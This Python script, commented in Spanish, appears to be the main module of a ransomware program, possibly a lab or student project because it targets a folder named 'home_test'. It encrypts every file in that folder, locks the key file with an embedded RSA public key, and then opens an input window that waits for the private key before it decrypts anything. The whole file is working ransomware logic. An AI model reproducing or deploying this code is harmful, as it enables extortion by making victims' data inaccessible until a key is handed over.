from find_dir import find_dir_path
from rsa_crypto import encrypt_file, decrypt_file
from crypto_manager import encrypt_all_files, decrypt_all_files
from ventana import TextInputServer


keys_out_name = "encryption_keys.json"

# BUSCAR LA CARPETA "HOME_TEST"
matches = find_dir_path("home_test")
if not matches:
    print("No se encontraron directorios 'home_test'")
    exit(1)
target = matches[0]


# ENCRIPTAR TODOS LOS ARCHIVOS DENTRO
abs_path_keys = encrypt_all_files(target, keys_out_name=keys_out_name, echo=False)


# ENCRIPTAR EL ARCHIVO DE CLAVES CON RSA hibrido
pub_key = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtJ6pIOCZsj0lfPU8cFgn
OIjFFpDyHWCtMTlnvhWS/ukcfURR3oD5RgHEnDn39M3XVOKQ79GMzk4/xTkjMHTu
yO0xvu1IwhaH6c3W1wShfBGq8R6DnNrcQQrSh2M439KP89IIRKZtCxNYRkBRp/00
xMKiIiuYyrPbYIc1OH5yutIghy2UgQRzp1vdBJabBhdXnE9Kssavk+NNtvCrQzS3
nW22ZmbIRopR9DCYFfn/+fehQKgBpBiCwJZGJL7E40RdBp/CGatOrKMjlDk5C39C
X79Jv8hW82ckmLKInKX6qWQ6asbxRNI+yZba68E7YLcwqvphTdLa1exs46+xP95/
cQIDAQAB
-----END PUBLIC KEY-----
"""

abs_path_encrypted_keys = encrypt_file(abs_path_keys, pub_key, overwrite=True)


# ABRIR LA VENTANA PARA INGRESAR LA LLAVE PRIVADA PARA DESENCRIPTAR EL ARCHIVO DE CLAVES
def procesar(texto):
    print("Llave recibida:")
    print(texto)
    
    # LIMPIAR EL TEXTO RECIBIDO
    lines = texto.strip().splitlines()
    clean_key = '\n'.join(line.strip() for line in lines) + '\n'
    
    # DESENCRIPTAR EL ARCHIVO DE CLAVES CON RSA hibrido
    abs_path_decrypted_keys = decrypt_file(abs_path_encrypted_keys, clean_key, overwrite=True)
    
    # DESENCRIPTAR TODOS LOS ARCHIVOS DENTRO
    decrypt_all_files(target, keys_path=abs_path_decrypted_keys, echo=True)

    # Borrar el archivo de claves desencriptado
    import os
    os.remove(abs_path_decrypted_keys)
    os.remove(abs_path_encrypted_keys + ".hash")

TextInputServer(procesar).start()
